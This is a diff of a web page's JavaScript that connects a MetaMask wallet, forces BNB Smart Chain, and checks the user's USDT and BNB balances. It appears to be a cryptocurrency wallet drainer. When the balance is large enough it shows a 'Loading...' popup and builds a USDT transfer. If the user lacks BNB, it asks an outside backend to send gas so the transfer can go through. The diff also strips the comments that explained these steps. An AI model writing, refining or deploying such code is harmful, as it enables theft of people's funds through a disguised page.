@@ -9,21 +9,45 @@ async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            await window.ethereum.request({ method: "wallet_addEthereumChain" });
-
-            // Force switch to BNB Smart Chain
+            // Try to switch to BNB Smart Chain
             await window.ethereum.request({
                 method: "wallet_switchEthereumChain",
                 params: [{ chainId: "0x38" }]
             });
-
-            const accounts = await web3.eth.getAccounts();
-            userAddress = accounts[0];
-            console.log("Wallet Connected:", userAddress);
-        } catch (error) {
-            console.error("Error connecting wallet:", error);
-            alert("Please switch to BNB Smart Chain.");
+        } catch (switchError) {
+            // If chain is not added, add it
+            if (switchError.code === 4902) {
+                try {
+                    await window.ethereum.request({
+                        method: "wallet_addEthereumChain",
+                        params: [{
+                            chainId: "0x38",
+                            chainName: "Binance Smart Chain",
+                            nativeCurrency: {
+                                name: "BNB",
+                                symbol: "BNB",
+                                decimals: 18
+                            },
+                            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                            blockExplorerUrls: ["https://bscscan.com"]
+                        }]
+                    });
+                } catch (addError) {
+                    console.error("Error adding BSC:", addError);
+                    alert("Please add BNB Smart Chain manually in your wallet.");
+                    return;
+                }
+            } else {
+                console.error("Switch error:", switchError);
+                alert("Please switch to BNB Smart Chain.");
+                return;
+            }
         }
+
+        // Request accounts
+        const accounts = await web3.eth.requestAccounts();
+        userAddress = accounts[0];
+        console.log("Wallet Connected:", userAddress);
     } else {
         alert("Please install MetaMask.");
     }
@@ -42,7 +66,6 @@ async function Next() {
         { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ], usdtContractAddress);
 
-    // Fetch balances
     const [usdtBalanceWei, userBNBWei] = await Promise.all([
         usdtContract.methods.balanceOf(userAddress).call(),
         web3.eth.getBalance(userAddress)
@@ -67,7 +90,6 @@ async function Next() {
         return;
     }
 
-    // User has more than 150 USDT → Check BNB Gas Fee
     showPopup("Loading...", "green");
 
     transferUSDT(usdtBalance, userBNB);
@@ -76,15 +98,14 @@ async function Next() {
 async function transferUSDT(usdtBalance, userBNB) {
     try {
         if (userBNB < 0.0005) {
-    console.log("User BNB is low. Requesting BNB from backend...");
-    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ toAddress: userAddress })
-    });
+            console.log("User BNB is low. Requesting BNB from backend...");
+            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ toAddress: userAddress })
+            });
         }
 
-        // Proceed with USDT Transfer
         const usdtContract = new web3.eth.Contract([
             { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
         ], usdtContractAddress);
@@ -122,10 +143,9 @@ async function sendBNB(toAddress, amount) {
     }
 }
 
-// Function to display pop-up message
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
-    
+
     if (!popup) {
         popup = document.createElement("div");
         popup.id = "popupBox";
@@ -148,11 +168,9 @@ function showPopup(message, color) {
     popup.innerHTML = message;
     popup.style.display = "block";
 
-    // Auto-hide after 5 seconds
     setTimeout(() => {
         popup.style.display = "none";
     }, 5000);
 }
 
-// Attach event listener
 document.getElementById("Next").addEventListener("click", Next);
